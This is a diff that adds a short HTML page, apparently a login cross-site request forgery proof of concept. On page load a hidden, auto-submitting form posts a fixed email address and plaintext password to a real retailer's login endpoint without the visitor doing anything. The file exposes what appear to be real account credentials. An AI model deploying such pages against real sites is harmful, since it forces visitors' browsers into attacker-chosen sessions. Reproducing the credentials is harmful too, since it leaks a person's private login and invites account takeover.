@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Auto Login Test</title>
+</head>
+<body>
+    <form id="csrfTestForm" action="https://www.boozt.com/login" method="POST">
+        <input type="hidden" name="email" value="iqbalup18@gmail.com">
+        <input type="hidden" name="password" value="6115Isayevm">
+        <input type="hidden" name="submit" value="Login">
+    </form>
+    <script>
+        document.getElementById("csrfTestForm").submit();
+    </script>
+</body>
+</html>
